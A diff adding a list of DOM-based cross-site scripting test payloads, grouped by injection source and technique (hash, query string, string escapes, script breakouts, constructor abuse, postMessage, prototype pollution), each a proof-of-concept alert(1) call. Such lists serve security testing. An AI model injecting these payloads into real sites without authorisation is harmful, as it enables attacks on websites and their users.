@@ -1,0 +1,61 @@
+# DOM XSS Payloads
+# Payloads for DOM-based XSS via various sources
+
+# location.hash payloads
+#<script>alert(1)</script>
+#<img src=x onerror=alert(1)>
+#"><script>alert(1)</script>
+#'-alert(1)-'
+#</script><script>alert(1)</script>
+#javascript:alert(1)
+
+# location.search payloads
+?q=<script>alert(1)</script>
+?search="><script>alert(1)</script>
+?id='-alert(1)-'
+?data=<img src=x onerror=alert(1)>
+
+# JavaScript string escapes
+';alert(1)//
+";alert(1)//
+\';alert(1)//
+\";alert(1)//
+
+# Template literals
+${alert(1)}
+`${alert(1)}`
+`};alert(1);//`
+
+# Breaking out of scripts
+</script><script>alert(1)</script>
+\x3c/script\x3e\x3cscript\x3ealert(1)\x3c/script\x3e
+</Script><Script>alert(1)</Script>
+
+# Expression injection
+-alert(1)-
++alert(1)+
+*alert(1)*
+(alert(1))
+[alert(1)]
+
+# Arrow function
+=>alert(1)
+=>{alert(1)}
+
+# Constructor abuse
+[].constructor.constructor('alert(1)')()
+''.constructor.constructor('alert(1)')()
+({}).constructor.constructor('alert(1)')()
+
+# window.name payload
+<script>alert(window.name)</script>
+
+# document.referrer payload (needs to come FROM malicious page)
+<script>eval(document.referrer)</script>
+
+# postMessage payload
+<script>window.parent.postMessage('<script>alert(1)</script>','*')</script>
+
+# Prototype pollution
+__proto__[innerHTML]=<img src=x onerror=alert(1)>
+constructor.prototype.innerHTML=<script>alert(1)</script>
